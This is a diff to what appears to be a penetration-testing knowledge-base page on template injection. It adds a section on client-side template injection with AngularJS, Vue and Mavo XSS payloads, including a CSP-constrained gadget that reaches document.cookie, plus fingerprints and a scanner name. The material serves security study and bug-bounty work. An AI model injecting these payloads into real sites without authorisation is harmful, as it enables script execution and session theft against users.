@@ -4,8 +4,8 @@ type: technique
 tags: [exploitation, h1, injection, rce, ssti, thm, web]
 phase: exploitation
 date_created: 2026-05-08
-date_updated: 2026-07-02
-sources: [thm-adv-ssti, thm-web-ssti-ctf, h1-scraped-ssti, 0xdf-linux-easy-web, payloadsallthethings-server-side-template-injection, git-payloadsallthethings, git-portswigger-all-labs, korchagin-successful-errors]
+date_updated: 2026-07-15
+sources: [thm-adv-ssti, thm-web-ssti-ctf, h1-scraped-ssti, 0xdf-linux-easy-web, payloadsallthethings-server-side-template-injection, git-payloadsallthethings, git-portswigger-all-labs, korchagin-successful-errors, hacktricks-web]
 ---
 
 # SSTI (Server-Side Template Injection)
@@ -452,6 +452,33 @@ SSTImap detects Jinja2, Twig, Smarty, Freemarker, Mako, and others.
 
 No paid SSTI reports in current H1 dataset (0 of 1,901 bounty reports tagged ssti). SSTI bugs do appear in disclosed reports but tend to be filed under RCE or custom weakness tags. Check `h1-scraped-rce` reports for template-injection root causes.
 
+## CSTI - client-side template injection (AngularJS / Vue / Mavo)
+
+Client-side template injection is SSTI in the browser: the JS framework compiles attacker-controlled template syntax and runs arbitrary JavaScript (XSS that survives HTML-encoding filters). Confirm the framework first, then confirm the exact sink; `{{7*7}}` returning `49` means the reflection is re-parsed as a template, not inert HTML. See [[xss]] and [[csp-bypass]] (whitelisted-CDN AngularJS is a CSP bypass gadget).
+
+Fingerprints: AngularJS (`ng-app`, `ng-bind`, `window.angular`), Vue (`v-` directives, Vue globals), Alpine (`x-data`, `x-html`), Mavo (`mv-`/`data-mv-`).
+
+AngularJS (>= 1.6 dropped the expression sandbox, so plain payloads fire; < 1.6 needs sandbox escapes):
+
+```javascript
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+<input ng-focus=$event.view.alert('XSS')>
+// CSP/ng-csp constrained: orderBy + event path still reaches code exec
+<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
+```
+
+Vue (runtime-only builds do NOT compile arbitrary strings; needs the template compiler or a `v-html`/dynamic-binding gadget):
+
+```javascript
+{{this.constructor.constructor('alert(1)')()}}          // V2 style
+{{_openBlock.constructor('alert(1)')()}}                // V3
+{{_createVNode.constructor('alert(1)')()}} {{_toDisplayString.constructor('alert(1)')()}}
+"><div v-html="''.constructor.constructor('alert(1)')()">x</div>
+```
+
+Helper names vary by V3 build; once V3 CSTI is confirmed, enumerate nearby `_`-prefixed helpers. Mavo parses non-JS expression syntax, useful when `alert(1)` tokens are filtered: `[self.alert(1)]`, `[7*7]`, `<a data-mv-if='1 or self.alert(1)'>x</a>`. Tool for AngularJS-heavy targets: ACSTIS (angularjs-csti-scanner).
+
 ## Detection and defence
 
 - **Never embed raw user input in templates** — always pass user data as template variables (context), never as part of the template string itself
@@ -473,6 +500,7 @@ No paid SSTI reports in current H1 dataset (0 of 1,901 bounty reports tagged sst
 - THM Advanced Web — SSTI room (`serversidetemplateinjection`)
 - THM CTF: Injectics (Twig SSTI via sort filter after SQLi auth bypass)
 - Vladislav Korchagin, "Successful Errors: New Code Injection and SSTI Techniques" (2025 top-10 #1); repo `vladko312/Research_Successful_Errors` (slug: korchagin-successful-errors).
+- HackTricks (pentesting-web) - client-side template injection (slug: hacktricks-web).
 
 ## From the Wild
 
